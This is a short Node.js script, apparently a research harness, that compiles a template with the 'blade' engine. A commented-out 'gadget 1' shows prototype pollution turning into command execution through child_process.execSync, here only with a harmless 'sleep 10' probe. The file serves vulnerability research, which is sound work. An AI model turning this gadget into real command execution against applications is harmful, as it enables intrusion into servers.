const blade = require('blade');

// gadget 1
// Object.prototype.obj = {
//     name: "somename",
//     value: "somevalue",
//     code: "process.mainModule.require('child_process').execSync(`sleep 10`)"
// }

try{
    Object._expose.setupSymbols()
}
catch(e){
    console.log("[!] symbolic execution not enabled")
}


const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;

blade.compile(template, {'debug': true}, function(err, tmpl) {
    console.log(err);
    tmpl({'nav': []}, function(err, html) {
        console.log(html, err);
    });
});